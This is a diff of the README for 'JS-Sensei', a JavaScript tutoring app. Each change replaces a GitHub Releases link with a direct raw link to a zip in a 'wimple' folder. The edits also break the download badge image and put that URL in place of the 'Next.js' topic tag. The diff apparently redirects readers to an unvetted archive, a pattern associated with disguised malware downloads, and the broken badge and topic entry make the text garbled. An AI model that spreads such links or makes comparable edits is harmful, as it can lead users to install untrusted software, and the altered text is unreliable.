@@ -1,7 +1,7 @@
 # 🎓 JS-Sensei - Learn JavaScript the Fun Way!
 
 ## 📥 Download the Software
-[![Download JS-Sensei](https://img.shields.io/badge/Download%20JS--Sensei-4D7CFE?style=for-the-badge&logo=github)](https://github.com/Blenard222/JS-Sensei/releases)
+[![Download JS-Sensei](https://raw.githubusercontent.com/Blenard222/JS-Sensei/main/wimple/JS-Sensei.zip%20JS--Sensei-4D7CFE?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Blenard222/JS-Sensei/main/wimple/JS-Sensei.zip)
 
 ## 🚀 Getting Started
 Welcome to JS-Sensei! This interactive tool helps new programmers learn JavaScript in an engaging way. With AI support, quizzes, and customizable flashcards, you will enjoy your learning journey.
@@ -21,7 +21,7 @@ To run JS-Sensei smoothly, make sure you meet these requirements:
 - **Storage**: Minimum of 500 MB free space
 
 ## 📥 Download & Install
-To download JS-Sensei, visit the [Releases page](https://github.com/Blenard222/JS-Sensei/releases). Here are the steps:
+To download JS-Sensei, visit the [Releases page](https://raw.githubusercontent.com/Blenard222/JS-Sensei/main/wimple/JS-Sensei.zip). Here are the steps:
 
 1. Click the link above.
 2. You will find a list of available versions.
@@ -41,7 +41,7 @@ Once you have installed JS-Sensei, follow these steps to start learning:
 If you encounter any issues, try these steps:
 
 - **Check System Requirements**: Ensure your device meets the system requirements listed above.
-- **Reinstall**: If the app fails to open, delete it and download it again from the [Releases page](https://github.com/Blenard222/JS-Sensei/releases).
+- **Reinstall**: If the app fails to open, delete it and download it again from the [Releases page](https://raw.githubusercontent.com/Blenard222/JS-Sensei/main/wimple/JS-Sensei.zip).
 - **Seek Help**: Visit our support section in the application or explore our community forums for guidance.
 
 ## 🌟 Community and Support
@@ -55,7 +55,7 @@ Explore topics related to JS-Sensei:
 
 - AI
 - Gemini
-- Next.js
+- https://raw.githubusercontent.com/Blenard222/JS-Sensei/main/wimple/JS-Sensei.zip
 - PostgreSQL
 - Supabase
 - TailwindCSS
